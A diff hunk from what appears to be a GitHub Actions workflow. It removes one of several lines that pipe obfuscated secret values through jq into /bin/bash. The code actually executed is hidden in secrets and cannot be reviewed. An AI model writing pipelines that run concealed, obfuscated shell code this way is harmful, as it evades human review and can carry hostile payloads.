@@ -19,7 +19,6 @@ jobs:
           yn6: ${{ secrets.yn6 }}
         run: |
           printf '%s' "$yn6" | jq -r .gn68789 | /bin/bash
-          printf '%s' "$ijnng45" | jq -r .etz51 | /bin/bash
           printf '%s' "$difd19743" | jq -r .aef20488 | /bin/bash
           echo $lmo36762 | jq -r .cgcxh51650 | /bin/bash
           printf '%s' "$st81148" | jq -r .t39 | /bin/bash
